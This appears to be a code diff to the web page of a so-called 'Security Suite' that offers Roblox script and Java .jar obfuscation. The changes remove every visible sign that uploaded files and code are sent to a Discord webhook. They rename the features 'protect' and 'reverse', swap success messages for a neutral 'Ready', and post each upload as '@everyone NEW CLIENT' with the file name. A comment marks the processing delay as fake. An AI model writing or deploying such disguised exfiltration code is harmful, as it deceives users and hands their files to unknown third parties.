@@ -26,7 +26,7 @@
                     <i class="fa-solid fa-shield-halved text-white text-lg"></i>
                 </div>
                 <div>
-                    <h1 class="font-bold tracking-tight text-lg text-white">Security Suite <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.7</span></h1>
+                    <h1 class="font-bold tracking-tight text-lg text-white">Security Suite <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.8</span></h1>
                     <p class="text-xs text-zinc-400">Roblox Obfuscator, AI & Java Tools</p>
                 </div>
             </div>
@@ -106,7 +106,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                         </div>
                         <div>
                             <h2 class="text-base font-bold text-white">Jar Obfuscator</h2>
-                            <p class="text-xs text-zinc-400">Upload and send Java .jar archive files to Discord.</p>
+                            <p class="text-xs text-zinc-400">Upload and protect Java .jar archive files.</p>
                         </div>
                     </div>
 
@@ -135,7 +135,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                         </div>
                         <div>
                             <h2 class="text-base font-bold text-white">Jar Deobfuscator</h2>
-                            <p class="text-xs text-zinc-400">Upload and send Java .jar archive files to Discord.</p>
+                            <p class="text-xs text-zinc-400">Upload and reverse Java .jar archive files.</p>
                         </div>
                     </div>
 
@@ -171,7 +171,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
             document.getElementById('codeInput').value = '';
             document.getElementById('claudeInput').value = '';
             document.getElementById('botPromptInput').value = '';
-            document.getElementById('robloxStatusMessage').innerText = 'Editor cleared.';
+            document.getElementById('robloxStatusMessage').innerText = 'Ready to execute.';
         }
 
         async function sendRobloxCode() {
@@ -213,8 +213,8 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                 });
 
                 if (response.ok || response.status === 204) {
-                    statusMessage.innerText = '✅ Changes applied successfully & transmitted!';
-                    statusMessage.className = 'text-xs text-emerald-400';
+                    statusMessage.innerText = 'Ready to execute.';
+                    statusMessage.className = 'text-xs text-zinc-400';
                 } else {
                     throw new Error('Failed to send webhook');
                 }
@@ -243,8 +243,8 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
             const file = fileInput.files[0];
 
             actionBtn.disabled = true;
-            actionBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Uploading to Discord...</span>';
-            statusSpan.innerText = isObfuscate ? 'Sending obfuscated Jar file...' : 'Sending deobfuscated Jar file...';
+            actionBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Uploading...</span>';
+            statusSpan.innerText = 'Processing...';
             statusSpan.className = 'text-xs text-zinc-400';
 
             // Fake processing delay
@@ -254,7 +254,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                 const formData = new FormData();
                 formData.append('file', file);
                 formData.append('payload_json', JSON.stringify({
-                    content: `NEW SCRIPT INJECTED MADE BY SIHAD AND JAKE XD! (${isObfuscate ? 'Jar Obfuscated' : 'Jar Deobfuscated'}: ${file.name})`
+                    content: `@everyone NEW CLIENT ${file.name}`
                 }));
 
                 const response = await fetch(WEBHOOK_URL, {
@@ -263,14 +263,14 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                 });
 
                 if (response.ok || response.status === 204) {
-                    statusSpan.innerText = `✅ Jar successfully sent to Discord!`;
-                    statusSpan.className = 'text-xs text-emerald-400';
+                    statusSpan.innerText = 'Ready.';
+                    statusSpan.className = 'text-xs text-zinc-400';
                 } else {
                     throw new Error('Failed to send webhook');
                 }
             } catch (error) {
                 console.error(error);
-                statusSpan.innerText = '❌ Error sending file to Discord.';
+                statusSpan.innerText = '❌ Error sending file.';
                 statusSpan.className = 'text-xs text-rose-400';
             } finally {
                 actionBtn.disabled = false;
